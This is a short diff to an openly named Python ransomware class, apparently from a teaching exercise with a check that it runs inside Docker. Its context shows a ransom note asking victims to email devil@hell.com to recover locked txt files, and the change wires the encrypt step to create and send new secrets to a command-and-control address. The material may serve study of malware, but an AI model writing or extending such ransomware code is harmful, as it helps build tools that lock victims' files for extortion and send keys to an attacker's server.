@@ -24,7 +24,7 @@ Your txt files have been locked. Send an email to devil@hell.com with title '{to
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
-        self._log = logging.getLogger("Ransomware")
+        self._log = logging.getLogger(self.__class__.__name__)
 
     def check_hostname_is_docker(self)->None:
         # At first, we check if we are in a docker
@@ -53,6 +53,10 @@ class Ransomware:
     def encrypt(self):
         # main function for encrypting (see PDF)
         self._log.info(ransomware.get_files("*.txt"))
+        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS)
+        self._secret_manager.create()
+        self._secret_manager.post_new()
+        
 
     def decrypt(self):
         # main function for decrypting (see PDF)
